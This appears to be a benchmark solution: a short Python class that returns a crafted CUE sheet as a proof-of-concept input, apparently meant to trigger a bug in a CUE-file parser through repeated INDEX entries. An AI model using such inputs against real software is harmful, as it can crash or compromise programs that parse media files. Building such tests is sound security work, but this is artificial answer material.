class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_str = """FILE "testfil.bin" BINARY
  TRACK 01 AUDIO
    INDEX 01 00:00:00
    INDEX 02 00:01:00
    INDEX 03 00:02:00
    INDEX 04 00:03:00
    INDEX 05 00:04:00
"""
        poc = poc_str.replace('\n', '\r\n').encode('ascii')
        return poc